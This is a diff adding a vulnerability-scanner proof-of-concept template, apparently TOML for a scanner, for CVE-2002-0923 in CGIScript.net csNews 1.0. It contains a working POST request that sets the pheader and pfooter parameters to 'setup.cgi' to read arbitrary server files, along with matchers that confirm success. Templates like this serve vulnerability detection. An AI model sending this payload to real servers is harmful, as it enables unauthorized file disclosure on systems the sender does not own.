@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "通过修改 csNews.cgi 高级设置中的 pheader/pfooter 参数为任意文件路径（如 setup.cgi），绕过文件类型检查，导致服务器端任意文件可被读取。需要认证用户权限。"
+id = "POC-AVE-2002-0475"
+name = "CGIScript.net csNews 1.0 文件类型限制绕过 PoC"
+severity = "high"
+tags = ["ave-2002-0475"]
+vuln_id = [
+    "CVE-2002-0923",
+    "AVE-2002-0475",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/csNews.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "action=admin&pheader=setup.cgi&pfooter=setup.cgi"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "setup.cgi",
+    "Content-Type",
+]
